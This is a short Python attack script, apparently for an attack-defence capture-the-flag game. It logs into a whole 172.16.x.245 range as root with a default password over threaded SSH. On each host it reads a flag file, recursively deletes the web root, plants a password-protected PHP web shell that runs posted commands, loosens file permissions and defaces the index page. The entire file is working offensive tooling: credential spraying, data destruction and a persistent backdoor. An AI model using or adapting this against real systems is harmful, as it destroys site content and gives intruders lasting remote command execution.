import paramiko
import threading

page_html = '<?php if (md5($_POST["pass"]) == "78842815248300fa6ae79f7776a5080a"){ @ system($_POST[cmd]);}?>'


def ssh_exec(target):
    print(target)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=target, port=config['port'], username=config['username'],
                    password=config['password'], timeout=3)
        stdin, stdout, stderr = ssh.exec_command(command, timeout=3)
        echo(stdout.read().decode())
        ssh.close()
        print(target)
    except Exception as e:
        pass


def echo(text):
    text = text

    with open(config['logFile'], 'a+') as f:
        f.write(text)

    print(text)


if __name__ == '__main__':
    config = {
        'username': 'root',
        'password': '123456',
        'port': 22,
        'logFile': 'logExec.txt'
    }
    command = f'cat flagvalue.txt;rm -r /var/www/html/*;echo "{page_html}" > /var/www/html/houtai/index.php;chmod 777 /var/www/html/.config.php; echo "404_not_found" > /var/www/html/index.html'

    print(command)
    # command = f"cat flag"

    targets = []
    ip = '172.16.%s.245'
    for i in range(1, 255):
        targets.append(ip % i)
    for target in targets:
        t = threading.Thread(target=ssh_exec, args=(target,))
        t.start()
